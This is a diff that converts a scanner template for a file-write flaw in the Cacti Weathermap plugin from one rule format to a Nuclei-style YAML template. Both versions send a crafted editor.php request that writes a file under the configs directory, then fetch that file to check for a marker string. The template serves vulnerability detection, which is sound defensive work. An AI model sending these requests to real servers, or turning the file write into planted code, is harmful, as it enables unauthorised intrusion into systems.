@@ -1,20 +1,27 @@
 id: cacti-weathermap-file-write
 
 info:
-    name: Cacti Weathermap File Write
-    author: whynot(https://github.com/notwhy)
-    severity: high
-    verified: true
+  name: Cacti Weathermap File Write
+  author: pikpikcu
+  severity: medium
+  tags: injection,cacti
+  metadata:
+    max-request: 2
 
-rules:
-    r0:
-        request:
-            method: GET
-            path: /plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created%3A%2B%25b%2B%25d%2B%25Y%2B%25H%3A%25M%3A%25S&map_linkdefaultwidth=7
-        expression: response.status == 200
-    r1:
-        request:
-            method: GET
-            path: /plugins/weathermap/configs/test.php
-        expression: response.status == 200 && response.body.bcontains(b"46ea1712d4b13b55b3f680cc5b8b54e8")
-expression: r0() && r1()
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/plugins/weathermap/editor.php?plug=0&mapname=poc.conf&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7"
+  - method: GET
+    path:
+      - "{{BaseURL}}/plugins/weathermap/configs/poc.conf"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "TITLE 46ea1712d4b13b55b3f680cc5b8b54e8"
+        part: body
+      - type: status
+        status:
+          - 200
